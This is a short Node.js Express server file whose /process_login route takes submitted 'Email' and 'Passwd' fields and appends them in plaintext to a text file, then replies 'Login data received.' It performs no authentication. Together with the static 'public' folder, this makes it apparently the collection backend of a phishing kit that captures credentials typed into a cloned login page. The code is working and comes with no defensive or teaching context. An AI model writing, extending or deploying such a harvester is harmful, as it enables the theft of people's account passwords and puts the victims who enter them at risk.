const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 8080;

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // Serve static files from the 'public' directory

// Handle form submissions
app.post('/process_login', (req, res) => {
    const { Email, Passwd } = req.body;
    const data = `Email: ${Email}, Password: ${Passwd}\n`;

    // Save data to a file
    fs.appendFile(path.join(__dirname, 'login_data.txt'), data, (err) => {
        if (err) {
            res.status(500).send('Error saving data.');
            return;
        }
        res.send('Login data received.');
    });
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
